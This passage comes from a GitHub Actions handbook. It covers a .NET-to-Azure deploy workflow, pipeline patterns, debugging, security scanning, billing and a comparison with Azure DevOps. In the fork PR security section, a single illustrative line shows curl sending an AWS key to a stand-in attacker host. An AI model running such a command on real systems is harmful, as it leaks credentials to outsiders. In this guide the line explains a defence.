      - name: Set up .NET
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: ${{ env.DOTNET_VERSION }}

      - name: Cache NuGet packages
        uses: actions/cache@v4
        with:
          path: ~/.nuget/packages
          key:  ${{ runner.os }}-nuget-${{ hashFiles('**/*.csproj') }}
          restore-keys: |
            ${{ runner.os }}-nuget-

      - name: Restore
        run: dotnet restore

      - name: Format check (lint)
        run: dotnet format --verify-no-changes

      - name: Build
        run: dotnet build --configuration ${{ env.CONFIGURATION }} --no-restore

      - name: Test with coverage
        run: |
          dotnet test \
            --configuration ${{ env.CONFIGURATION }} \
            --no-build \
            --logger "trx" \
            --collect:"XPlat Code Coverage"

      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: '**/TestResults/**/*.trx'

      - name: Publish
        run: |
          dotnet publish ./src/MyApp/MyApp.csproj \
            -c ${{ env.CONFIGURATION }} \
            -o ./publish \
            --no-build

      - name: Upload publish output
        uses: actions/upload-artifact@v4
        with:
          name: app-publish
          path: ./publish

  # ───── CD: build image, push to ACR, deploy to App Service ─────
  deploy:
    needs: build-and-test
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    environment: production
    steps:
      - uses: actions/checkout@v4

      - uses: actions/download-artifact@v4
        with:
          name: app-publish
          path: ./publish

      - uses: azure/login@v2
        with:
          client-id:       ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id:       ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      - name: Log in to Azure Container Registry
        run: az acr login --name ${{ env.ACR_NAME }}

      - name: Build and push image
        run: |
          docker build \
            -t ${{ env.ACR_NAME }}.azurecr.io/${{ env.IMAGE_NAME }}:${{ github.sha }} \
            -t ${{ env.ACR_NAME }}.azurecr.io/${{ env.IMAGE_NAME }}:latest \
            -f Dockerfile .
          docker push ${{ env.ACR_NAME }}.azurecr.io/${{ env.IMAGE_NAME }}:${{ github.sha }}
          docker push ${{ env.ACR_NAME }}.azurecr.io/${{ env.IMAGE_NAME }}:latest

      - name: Deploy to Azure App Service
        uses: azure/webapps-deploy@v3
        with:
          app-name: ${{ env.APP_SERVICE_NAME }}
          images:   ${{ env.ACR_NAME }}.azurecr.io/${{ env.IMAGE_NAME }}:${{ github.sha }}
```

#### Steps, in plain English

| Step | What it does | Why it's there |
|------|--------------|----------------|
| `checkout` | Clones the repo onto the runner. | Every job that touches code needs this first. |
| `setup-dotnet` | Installs the .NET 8 SDK. | The runner doesn't have your specific SDK pinned. |
| `actions/cache` | Caches `~/.nuget/packages` keyed by csproj hashes. | Saves 30–90 seconds per build for unchanged deps. |
| `dotnet restore` | Pulls down all NuGet packages. | Needed before `build`. |
| `dotnet format --verify-no-changes` | Static formatting check; fails if code isn't formatted. | This is the "lint" step for .NET. |
| `dotnet build --no-restore` | Compiles in Release configuration. | `--no-restore` skips a redundant restore. |
| `dotnet test` | Runs the unit tests with code coverage. | The whole point of CI. |
| `upload-artifact` (test results) | Saves the .trx test results. | Lets reviewers download them, attaches to the run summary. |
| `dotnet publish` | Packages the app for deployment. | Produces the binaries the deploy job will ship. |
| `upload-artifact` (app-publish) | Hands the build output off to the deploy job. | Jobs run on different runners — artifacts are how they share files. |
| `azure/login` (OIDC) | Authenticates the runner to Azure with a short-lived token. | No long-lived service principal credentials in GitHub. |
| `az acr login` | Authenticates Docker to ACR using the Azure session. | So `docker push` works. |
| `docker build / push` | Builds the image and pushes both `:sha` and `:latest` tags. | SHA tag for traceability, `latest` for convenience. |
| `azure/webapps-deploy` | Tells App Service to pull the new image. | The actual deployment. |

#### What you need to set up before this works

The workflow assumes the following exists. None of it lives in the repo — these are one-time platform prerequisites.

1. **An Azure subscription** with an Azure Container Registry (`mycompanyregistry`) and an App Service configured to run a Linux container.
2. **An Azure AD app registration** (a "service principal") with:
   - `acrPush` role on the ACR.
   - `Contributor` role on the App Service resource group.
   - **Federated credentials** that trust GitHub Actions OIDC tokens for `repo:owner/repo:ref:refs/heads/main`.
3. **GitHub secrets** in the repo:
   - `AZURE_CLIENT_ID` — the AD app's Application (client) ID.
   - `AZURE_TENANT_ID` — your tenant ID.
   - `AZURE_SUBSCRIPTION_ID` — the subscription that holds the resources above.
4. **A Dockerfile** in the repo root that builds your .NET app into a runnable container.
5. **GitHub Environment** named `production` (Settings → Environments → New) with required reviewers if you want a human approval before deploy.

#### Running it for real (and what usually goes wrong the first time)

You can't fully execute this from inside a doc — it needs your Azure subscription. But here's what the first end-to-end run normally looks like:

1. **Push the workflow file** → CI runs, tests pass, build artifacts upload. ✅
2. **Merge to main** → deploy job kicks off. Runner spins up.
3. **OIDC step fails** with "AADSTS70021: No matching federated identity record found." 😬 Fix: in the Azure AD app, add a federated credential whose subject exactly matches `repo:<owner>/<repo>:ref:refs/heads/main`.
4. **Re-run** → OIDC works, but `az acr login` fails with insufficient permissions. Fix: add the `acrPush` role on the ACR for the AD app.
5. **Re-run** → image pushes, but `webapps-deploy` fails because the App Service is configured for code, not container. Fix: in the App Service, switch to Container deployment and set the registry URL.
6. **Re-run** → deploys successfully.

Each of these is a one-time setup error. After the first successful run, this workflow is boringly reliable. (The first run is always the hardest one — even for people who do this for a living.)

#### Mapping back to earlier sections

| Concept used here | Covered in |
|-------------------|------------|
| Two-job pipeline (`build-and-test` → `deploy`) | Scenario 2 |
| Job-level `if:` to deploy only on `main` push | Section 10.2 |
| Dependency caching (`actions/cache`) | Recipe 7 |
| Artifacts to share files between jobs | Section 7 |
| OIDC to Azure | Section 9 (Key Vault subsection) and Section 10.1 |
| `permissions: id-token: write` for OIDC | Section 10.1 |
| Environment with required reviewers | Scenario 7 |

---

## 12. Real-world pipeline patterns

Recipes are copy-paste. Patterns are how you *think*. Every real pipeline is a combination of these twelve patterns. Learn them and you'll find you never have to start a new workflow from a blank page — you'll just remix patterns you already know.

### Scenario 1 — Release tag deployment

When you create a tag, the workflow deploys.

```bash
git tag v1.0.0
git push origin v1.0.0
```

```yaml
on:
  push:
    tags:
      - 'v*'
```

Pushing `v1.0.0` triggers the deploy. Most teams use this for production — it's a clean, controlled trigger that doesn't fire on every commit.

### Scenario 2 — Sequential execution

Task B only runs after Task A succeeds. Build → Test → Deploy.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

  test:
    needs: build
    runs-on: ubuntu-latest

  deploy:
    needs: test
    runs-on: ubuntu-latest
```

Strict order. Each stage waits for the previous one to finish successfully.

### Scenario 3 — Parallel execution

Multiple jobs at once. The default behavior.

```yaml
jobs:
  backend-test:
    runs-on: ubuntu-latest

  frontend-test:
    runs-on: ubuntu-latest

  api-test:
    runs-on: ubuntu-latest
```

No `needs:` anywhere, so all three run simultaneously. Faster feedback, more runner minutes burned.

### Scenario 4 — Mixed (sequential then parallel then sequential)

The shape of most real pipelines. Build once, fan out to parallel work, then converge on a final step.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

  service-a:
    needs: build
    runs-on: ubuntu-latest

  service-b:
    needs: build
    runs-on: ubuntu-latest

  service-c:
    needs: build
    runs-on: ubuntu-latest

  final-check:
    needs: [service-a, service-b, service-c]
    runs-on: ubuntu-latest
```

Visually:

```
            → service-a →
build →     → service-b →     → final-check
            → service-c →
```

The final job declares all three services in its `needs:` array, so it waits for all of them.

### Scenario 5 — Microservices deployment (the real-world question)

People ask: should I deploy microservices one at a time, or in parallel?

The answer is: it depends on dependencies.

- **Case A — services are independent.** Deploy in parallel. Much faster.
- **Case B — service B depends on service A.** Sequential. Run A first, then B.

The trap is forcing everything into a chain just because it feels "safer." It's not safer, it's slower. And if your services are truly decoupled, they shouldn't need to be deployed in lockstep.

### Scenario 6 — Staged rollout (v5.1 → v5.2 → v5.3)

Controlled version rollout, also known as a canary release. Each step verifies health before the next one starts.

```
deploy v5.1 → check
deploy v5.2 → check
deploy v5.3
```

Useful when blast radius matters — rolling a new version to one tenant group at a time, for example, so you can bail out after the first group if something goes wrong.

### Scenario 7 — Environment-based deployment with approval gates

Promote one build through dev → staging → production, with a human approval before prod.

GitHub has a feature called **Environments** (Settings → Environments). Each environment can require reviewers. When a job references that environment, the job pauses until someone clicks Approve.

```yaml
on:
  push:
    branches: [main]

jobs:
  deploy-dev:
    runs-on: ubuntu-latest
    environment: dev
    steps:
      - run: ./deploy.sh dev

  deploy-staging:
    needs: deploy-dev
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - run: ./deploy.sh staging

  deploy-prod:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production      # configured with required reviewers
    steps:
      - run: ./deploy.sh production
```

Environments can also hold environment-scoped secrets — a different API key per stage — so your staging key can't accidentally deploy to production.

### Scenario 8 — Monorepo / path-filtered builds

In a repo holding multiple projects, you don't want changes to the docs folder triggering the full backend test suite.

```yaml
on:
  push:
    paths:
      - 'backend/**'
      - '.github/workflows/backend.yml'
  pull_request:
    paths:
      - 'backend/**'
```

This workflow only runs when files under `backend/` (or the workflow file itself) change. Pair one such workflow per project and each stays independent.

If you need finer control inside a single workflow (say, different jobs for different paths), use `dorny/paths-filter@v3`:

```yaml
jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      backend: ${{ steps.filter.outputs.backend }}
      frontend: ${{ steps.filter.outputs.frontend }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            backend: 'backend/**'
            frontend: 'frontend/**'

  backend-test:
    needs: changes
    if: needs.changes.outputs.backend == 'true'
    runs-on: ubuntu-latest
    steps: [...]
```

### Scenario 9 — Concurrency control

Two deploys racing is a classic way to break an environment. One line fixes it:

```yaml
concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

All runs that compute the same `group` string line up. With `cancel-in-progress: true`, a newer run kills the older one. For production deploys where cancelling mid-flight is dangerous, set it to `false` — newer runs wait instead.

### Scenario 10 — Fork PR security

The rule: when a contributor opens a PR from their fork, GitHub strips access to your secrets. The `GITHUB_TOKEN` is also read-only. This is deliberate — you don't want a random PR running `curl evil.com -d "$AWS_KEY"` with your credentials.

There are two related events that behave very differently:

| Event | Runs on | Has secrets? | Checks out |
|-------|---------|--------------|------------|
| `pull_request` | Forked PR code | No (external forks) | The PR branch |
| `pull_request_target` | Base branch code | Yes | The base branch by default |

The safe pattern: use `pull_request` for tests (no secrets needed). Never check out PR code inside a `pull_request_target` workflow that has secrets — that's how the nasty supply-chain incidents happen.

### Scenario 11 — Auto-rollback on health check failure

Deploy, check if it's healthy, roll back if not.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Capture current version
        id: prev
        run: echo "sha=$(cat current-version.txt)" >> $GITHUB_OUTPUT

      - name: Deploy new version
        run: ./deploy.sh ${{ github.sha }}

      - name: Health check
        id: health
        run: ./scripts/health-check.sh
        continue-on-error: true

      - name: Roll back if unhealthy
        if: steps.health.outcome == 'failure'
        run: ./deploy.sh ${{ steps.prev.outputs.sha }}

      - name: Fail the workflow if rolled back
        if: steps.health.outcome == 'failure'
        run: exit 1
```

The `continue-on-error: true` lets the health check "fail softly" — the workflow doesn't stop, so the rollback step can react. Using `steps.health.outcome` (not `status`) is the bit that lets us see the failure even though `continue-on-error` hid it.

### Scenario 12 — Workflow chaining with `workflow_run`

One workflow triggers another when it finishes. Useful for separating CI from CD, or decoupling slow jobs from the main pipeline.

**Workflow A (`ci.yml`)** — the test workflow:

```yaml
name: CI
on:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
```

**Workflow B (`deploy.yml`)** — listens for A to succeed:

```yaml
name: Deploy
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
    branches: [main]

jobs:
  deploy:
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

Keeps test logic and deploy logic in separate files. Easier to read, safer to change.

### The combined shape

Most real production pipelines look roughly like this:

```
Trigger:
  - PR  → CI
  - Tag → Production CD

Pipeline:
  Build
     ↓
  Parallel Tests
     ↓
  Parallel Microservices Deploy
     ↓
  Final Health Check
```

And the rule of thumb:

- PR → CI.
- Tag → Release / CD.
- `needs:` → sequential.
- No `needs:` → parallel.
- Microservices → mostly parallel, unless one truly depends on another.

CI/CD design isn't really about workflows. It's about use cases and dependencies. The YAML is the easy part.

---

## 13. When you start repeating yourself

At some point you'll notice the same five steps showing up at the top of every workflow. That's your signal to extract. GitHub Actions offers two tools for this, and they solve different problems.

### 13.1 Reusable workflows — reuse a whole job

One workflow file calls another. The callee declares `workflow_call:` as its trigger.

Callee — `.github/workflows/reusable-test.yml`:

```yaml
on:
  workflow_call:
    inputs:
      node-version:
        required: true
        type: string
    secrets:
      NPM_TOKEN:
        required: false

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
      - run: npm ci
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
      - run: npm test
```

Caller — anywhere else:

```yaml
jobs:
  unit:
    uses: ./.github/workflows/reusable-test.yml
    with:
      node-version: '20'
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

Use this when the unit you want to reuse is a **whole job** — like a shared test harness.

### 13.2 Composite actions — reuse a cluster of steps

A composite action packs several steps into one reusable step. Lives at `.github/actions/<name>/action.yml`.

```yaml
name: 'Setup Node with cache'
description: 'Checkout, install Node with npm cache, and run npm ci'
inputs:
  node-version:
    required: true
    default: '20'
runs:
  using: 'composite'
  steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'
    - run: npm ci
      shell: bash
```

Usage:

```yaml
steps:
  - uses: ./.github/actions/setup-node-cached
    with:
      node-version: '20'
```

Use this when the thing you're reusing is a **setup pattern** — the first few steps of every job.

### Which one do I want?

| You want to reuse | Use |
|-------------------|-----|
| A whole job (or several) | Reusable workflow |
| A setup pattern of 2–5 steps | Composite action |
| Something across repos | Publish as a standalone repo action |
| Logic that needs its own runner | Reusable workflow (it owns `runs-on`) |

---

## 14. Debugging, and running workflows on your laptop

Workflows will fail. Your first instinct might be panic — don't. The tooling for figuring out what went wrong is pretty good once you know where to look.

### Reading logs

The failure is almost always in the last ten lines of the failed step. Click into the run, click the failed job, expand the red step, scroll to the bottom. That's usually enough.

When it isn't: the search box (top right) searches every step's output in one go. And the gear icon offers **Download log archive**, which gives you a zip with one text file per step — sometimes easier to grep through locally.

### Re-running

Three buttons live at the top right of every run page:

- **Re-run all jobs** — full restart, new run ID.
- **Re-run failed jobs** — skips the green jobs, retries the red ones, keeps the successful jobs' artifacts. Usually what you want.
- **From the CLI** — `gh run rerun <run-id> --failed`.

### Turning on verbose logging

Two repo secrets unlock noisy-but-useful output:

| Secret | Effect |
|--------|--------|
| `ACTIONS_STEP_DEBUG=true` | Shows step-level setup, env resolution, expression evaluation. |
| `ACTIONS_RUNNER_DEBUG=true` | Shows runner-level network, disk, shell diagnostics. |

Add them at Settings → Secrets and variables → Actions. Turn them off when you're done — they make every run slower and the logs harder to read.

### The "what is even in my environment right now" step

Paste this whenever a workflow is being weird:

```yaml
- name: Dump context
  run: |
    echo "=== GITHUB ==="
    echo "ref:    $GITHUB_REF"
    echo "sha:    $GITHUB_SHA"
    echo "actor:  $GITHUB_ACTOR"
    echo "event:  $GITHUB_EVENT_NAME"
    echo "=== ENV ==="
    env | sort
```

Half the time, that alone points at the problem.

### SSH into the runner (the nuclear option)

When nothing else works, `tmate` pauses the job and gives you an SSH address into the live runner:

```yaml
- name: Open SSH on failure
  if: failure()
  uses: mxschmitt/action-tmate@v3
  timeout-minutes: 15
```

Use this only on private repos and private branches. Anyone with the SSH address can connect. The `timeout-minutes` is a guardrail against forgotten open sessions.

### Iterating without pushing — `act`

`act` runs your workflows locally in Docker, so you don't have to push a commit for every tiny change.

```bash
brew install act               # macOS (other installers on the repo)
act                             # runs workflows triggered by 'push'
act pull_request                # simulates a PR event
act -j test                     # runs only the job named 'test'
act -s GITHUB_TOKEN=...         # pass secrets
```

One warning: `act` approximates GitHub-hosted runners, but doesn't replicate them exactly. Caches and some pre-installed tools differ. Use it to catch YAML errors and basic logic — not as your final verification before production.

---

## 15. Security scanning — the stuff you shouldn't skip

GitHub has a handful of built-in security features. Most are free, most are easy to turn on, and most teams leave them off because they're not aware of them. Take the ten minutes.

### CodeQL — static analysis

Finds common vulnerabilities (SQL injection, XSS, path traversal) by analyzing your source code. Turning it on is a two-click operation at **Security tab → Code scanning → Set up → Default**, or if you want more control, a workflow:

```yaml
name: CodeQL

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 0 * * 1'

jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with:
          languages: javascript, python
      - uses: github/codeql-action/analyze@v3
```

Findings show up under the Security tab. Don't ignore them.

### Dependabot — dependency hygiene

Dependabot opens PRs that bump versions of your dependencies when there's a known CVE. Turn it on at **Settings → Code security → Dependabot alerts / security updates**. Fine-tune with `.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Dependency review — block risky PRs

Blocks a PR that tries to introduce a dependency with a high-severity vulnerability:

```yaml
name: Dependency Review

on: [pull_request]

jobs:
  review:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
```

### Secret scanning

This one is built in — no workflow needed. GitHub scans every push for secret patterns it knows (AWS keys, Stripe tokens, GCP service accounts, a few hundred others) and alerts the repo owner. Turn on **push protection** at **Settings → Code security** and GitHub will reject the push itself before the secret even lands in history. Turn it on. Every repo.

---

## 16. Billing, minutes, and how not to burn through them

GitHub Actions is free for public repos. Truly, genuinely free, no cap. For private repos, minutes are metered — and it's easy to eat through them without realizing.

### The free tier

| Plan | Free minutes per month | Free storage |
|------|------------------------|--------------|
| Free | 2,000 | 500 MB |
| Pro / Team | 3,000 | 1 GB |
| Enterprise | 50,000 | 50 GB |

Public repos get unlimited minutes. The numbers above are private repos only.

### The cost multipliers

Each runner OS bills at a different rate, and this is where people get caught out:

| Runner | Multiplier |
|--------|------------|
| `ubuntu-latest` | 1× |
| `windows-latest` | 2× |
| `macos-latest` | 10× |
| Larger runners | 2–16× depending on tier |

A 10-minute macOS job eats 100 minutes of your quota. Ubuntu is the default for a reason — use macOS only when you're building or testing something Mac-specific.

### Keep an eye on it

Settings → Billing and plans → Usage this month. Worth checking monthly, especially after adding a scheduled workflow (those run whether you're looking or not).

### Ways to spend less

1. **Cancel redundant runs** — `concurrency: { cancel-in-progress: true }` stops older runs when a new push lands.
2. **Cache dependencies** — saves 1–3 minutes per job. Huge win.
3. **Path filters** — skip workflows that don't care about the files that changed.
4. **Matrix `include`/`exclude`** — test only the combinations you actually care about.
5. **Prefer Ubuntu** — 10× cheaper than macOS, 2× cheaper than Windows.
6. **Set `timeout-minutes`** — stops a runaway loop from eating hours:

   ```yaml
   jobs:
     build:
       runs-on: ubuntu-latest
       timeout-minutes: 15
   ```

7. **Self-hosted runners** — if you have the capacity, runners you host yourself cost zero minutes. You're trading money for maintenance work, so pick your battles.

---

## 17. From push to production — the end-to-end flow

Everything in this handbook is one piece of a larger picture. This section draws that picture. Follow a single code change from the moment a developer pushes it, all the way to a running version in production on a cloud provider. Every box in the diagram below maps back to something you've already read.

### The full flow

### What happens at each stage

**1. Developer pushes a branch.** Local code leaves the laptop and lands on GitHub. No automation has run yet — this is just a push.

**2. PR opened.** The moment a pull request is opened against `main`, your `pull_request` workflows fire. This is where CI lives.

**3. CI runs in parallel.** Lint, tests across the version matrix (with dependency caching to keep it fast), CodeQL static analysis, and dependency review all kick off together. They don't need each other, so `needs:` is absent. Fail-fast is usually on — one failure cancels the rest.

**4. All green?** If any check fails, the PR is blocked. The author pushes a fix and the cycle repeats. Nothing downstream happens.

**5. PR merged to main.** A push event now fires on `main`. Your CD workflow picks it up.

**6. Build and push the image.** The workflow builds a Docker image, tags it with the commit SHA (and/or a semantic version), and pushes to a registry. The `GITHUB_TOKEN` is enough to push to GHCR; cloud registries (ECR, ACR, GAR) authenticate via OIDC (step 9).

**7. Deploy to Dev, then Staging.** Both are automatic. Each uses a `environment:` scope that holds its own secrets and its own URL. Concurrency control (`concurrency: { cancel-in-progress: true }`) makes sure only one deploy runs per branch at a time.

**8. Manual approval gate.** Before production, a human has to click **Approve** in the Actions tab. This is the Environments feature doing its job — required reviewers block the production job until someone signs off.

**9. OIDC token handoff.** Your workflow exchanges a GitHub-signed identity token with the cloud provider. No long-lived keys in GitHub Secrets — the cloud verifies the token came from this specific workflow in this specific repo and mints a short-lived credential in response.

**10. Cloud orchestrator updates.** The short-lived credential is used to tell the cloud's orchestration service to pull the new image and roll the fleet. On AWS that's ECS or EKS. On Azure, AKS or App Service. On GCP, GKE or Cloud Run.

**11. Health check.** Once rolled, the workflow pings the service's health endpoint. If it passes, the run marks success and monitoring takes over from there. If it fails, the rollback step kicks in — re-deploy the previous SHA, send a Slack alert, and fail the workflow so the on-call team sees it.

### The cloud side, by provider

The diagram labels the three cloud providers inline. Here's the same mapping as a table, so you can look up the equivalent service:

| Step | AWS | Azure | GCP |
|------|-----|-------|-----|
| Container registry | ECR | ACR | Artifact Registry |
| Cluster / compute | ECS, EKS, Lambda | AKS, App Service, Functions | GKE, Cloud Run, Cloud Functions |
| Identity (OIDC) | IAM role via OIDC provider | Service principal via federated credential | Workload Identity Federation |
| Secrets (if not using OIDC) | AWS Secrets Manager / SSM | Azure Key Vault | Secret Manager |
| Monitoring | CloudWatch | Application Insights / Monitor | Cloud Monitoring |
| Logs | CloudWatch Logs | Azure Log Analytics | Cloud Logging |

The shape of the flow is the same in every case. The service names change; the pattern doesn't.

### Which pieces of this handbook show up where

If this section feels familiar, that's the point. The whole diagram is earlier sections composed together:

| Stage in the flow | What you use | Covered in |
|-------------------|--------------|------------|
| PR-triggered lint and tests | Parallel jobs, no `needs:` | Scenario 3, Recipe 1 |
| Matrix testing across versions | `strategy.matrix` | Recipe 5 |
| Dependency cache for speed | `actions/cache` | Recipe 7 |
| CodeQL, dependency review | GitHub-native security | Section 15 |
| Build Docker image and push to GHCR | Recipe 6 | Section 11 |
| Dev → Staging → Prod with approval | Environments + required reviewers | Scenario 7 |
| Only one deploy per branch at a time | `concurrency` | Scenario 9 |
| OIDC to the cloud provider | `permissions: { id-token: write }` | Section 10 |
| Health check + auto-rollback | `continue-on-error` + `steps.*.outcome` | Scenario 11 |
| Slack alert on failure | `if: failure()` + webhook | Recipe 8 |

### Reading the flow in reverse

A useful exercise: run your finger backwards up the diagram from "Deploy complete" to "Developer pushes branch" and for each stage, ask yourself:

- What triggers this stage?
- What could fail here?
- Where are the secrets coming from?
- Who has permission to change this configuration?

If you can answer all four at every stage of your own pipeline, you understand it well enough to be on-call for it. That, more than memorizing syntax, is the thing that makes someone genuinely useful at CI/CD.

---

## 18. GitHub Actions vs Azure DevOps Pipelines

If your team has been on Azure for a while, you've probably already used Azure DevOps Pipelines (its older name was VSTS). It solves the same problem GitHub Actions does, with slightly different vocabulary. This section is a quick "Rosetta Stone" plus an honest opinion on which to pick.

### The vocabulary maps almost one-to-one

| GitHub Actions | Azure DevOps Pipelines |
|----------------|------------------------|
| Workflow | Pipeline |
| Job | Stage / Job |
| Step | Step / Task |
| Action | Task |
| Runner | Agent |
| `.github/workflows/` (folder) | `azure-pipelines.yml` (root) |
| Marketplace | Tasks marketplace |
| `GITHUB_TOKEN` | `System.AccessToken` |
| Environments + required reviewers | Environments + approvals |
| Reusable workflows | Templates |
| Composite actions | Step templates |

If you're moving from one to the other, the mental model carries over. Most of what you learn translates.

### Where GitHub Actions wins (in my experience)

- **Tighter integration with the code**. Workflow files live next to the code they're building, in the same repo. PR-driven CI feels native; on Azure DevOps it feels stitched-on, especially when the repo is also on GitHub.
- **A bigger and fresher marketplace**. More community actions, more languages, more recent updates. The Azure DevOps Tasks ecosystem is solid but smaller.
- **Cleaner OIDC story to the clouds**. AWS, Azure, and GCP all have first-class GitHub OIDC support, and the configuration is well-documented. You can ship to production without ever creating a service principal password.
- **Free for public repos, no asterisks**. Unlimited minutes, indefinitely. Azure DevOps' free tier for public repos exists but the limits change more often.
- **Simpler YAML**. One file. No "stage vs. job" distinction until you actually need it. Less ceremony for small workflows.

### Where Azure DevOps still wins

- **First-class stages for big release pipelines**. If your release flow is "build → test → deploy to dev → wait for QA → deploy to staging → wait for product → deploy to prod across 5 regions," Azure DevOps' stages model that more naturally than GitHub Actions's `needs:` chains. GitHub can do it, but it gets verbose.
- **Boards + Repos + Pipelines as one product**. If your team already uses Azure Boards for tickets and Azure Repos for code, sticking with Pipelines is one less context switch.
- **Mature self-hosted agents for restricted networks**. Azure DevOps's self-hosted agent story is more polished for enterprises that can't have runners reaching out to the public internet.
- **Azure Artifacts for package feeds**. NuGet, npm, Maven, and Python feeds in one place with retention policies. GitHub Packages is catching up but isn't quite there for some ecosystems.
- **License posture for Microsoft-heavy shops**. If your org already pays Microsoft for everything else, adding Azure DevOps is often a paperwork formality.

### How to choose

A practical decision tree:

| Your situation | What I'd pick |
|----------------|---------------|
| Code on GitHub, deploying anywhere | **GitHub Actions**. The integration pays for itself. |
| Code on Azure Repos, deploying to Azure | **Azure DevOps Pipelines**. Same logic in reverse. |
| Code on GitHub, infrastructure on Azure, starting fresh | **GitHub Actions**, deploy *to* Azure. The OIDC story is excellent and the developer experience is better. |
| Complex multi-stage release pipelines (5+ stages, multiple approval gates per region) | **Azure DevOps Pipelines** — its stages model handles that complexity more cleanly. |
| Single product, small team, mostly CI | **GitHub Actions**. It's the lower-overhead choice. |

The honest summary: if you're starting today, GitHub Actions is the default. Azure DevOps is the right choice when you have specific reasons — usually existing Microsoft tooling investment or unusually complex release flows.

---

## 19. Abbreviations, defined

Reference list. Every short form used in this document, with a real definition — not just the expansion.

### CI/CD terms

**CI — Continuous Integration.** A practice of merging code changes frequently, with every merge verified by automated builds and tests. The point is to catch problems early, before they pile up.

**CD — Continuous Delivery / Continuous Deployment.** Two related ideas sharing one abbreviation. *Continuous Delivery* means every change that passes CI is packaged and ready to deploy, but the actual release is a one-click manual step. *Continuous Deployment* means every change that passes CI goes straight to production, no manual gate.

**CI/CD.** The combined pipeline from commit to running system.

**PR — Pull Request.** A request on GitHub to merge changes from one branch into another. Where code review and most automation happens.

### File formats and data

**YAML — YAML Ain't Markup Language.** A human-readable data-serialization format. Indentation (spaces, not tabs) defines structure. All GitHub Actions workflow files are YAML.

**JSON — JavaScript Object Notation.** A lightweight data interchange format. Most GitHub API responses are JSON.

**URL — Uniform Resource Locator.** The address of a resource on the web.

### Infrastructure

**VM — Virtual Machine.** A software-emulated computer that runs on shared physical hardware. GitHub Actions runners are VMs — fresh for each job, destroyed when the job ends.

**OS — Operating System.** The software layer that manages hardware. GitHub-hosted runners support Ubuntu, macOS, and Windows.

**UTC — Coordinated Universal Time.** The global time standard. Cron schedules in GitHub Actions are always evaluated in UTC, not your local time.

### Interfaces and tools

**API — Application Programming Interface.** A set of rules and endpoints that let software talk to software. The GitHub REST and GraphQL APIs are how workflows read and modify repo state programmatically.

**UI — User Interface.** The visual part that humans interact with. The Actions tab is the UI for workflow runs.

**CLI — Command Line Interface.** A text-based interface where users type commands. `git`, `gh`, `npm`, and `docker` are all CLIs you'll invoke from workflow steps.

### Security and identity

**SHA — Secure Hash Algorithm.** A family of cryptographic hash functions. Git uses SHA-1 (and increasingly SHA-256) for commit identifiers. Pinning a third-party action to a commit SHA is the most secure way to reference it.

**HTTPS — Hypertext Transfer Protocol Secure.** HTTP wrapped in TLS encryption. All GitHub API calls use HTTPS.

**PAT — Personal Access Token.** A token you create manually for authenticating with the GitHub API. Prefer the built-in `GITHUB_TOKEN` over PATs whenever you can.

**OIDC — OpenID Connect.** An identity protocol built on OAuth 2.0. GitHub Actions can exchange a short-lived OIDC token with cloud providers (AWS, GCP, Azure) to deploy without storing long-lived credentials as secrets.

**IAM — Identity and Access Management.** The framework that decides who can do what on a system. Relevant when your workflow deploys to a cloud — the workflow needs an IAM role or service principal with the right permissions.

**GHCR — GitHub Container Registry.** GitHub's built-in registry for container images at `ghcr.io`. Push and pull with `GITHUB_TOKEN` — no external registry account required.

### Short forms

**env — Environment (variable).** A named value available to processes at runtime. Set via the `env:` key or written to `$GITHUB_ENV`.

**repo — Repository.** A Git repository. On GitHub, it includes the code, history, issues, PRs, Actions, and settings.

**GH — GitHub.** The platform. Also the name of the official CLI tool (`gh`).
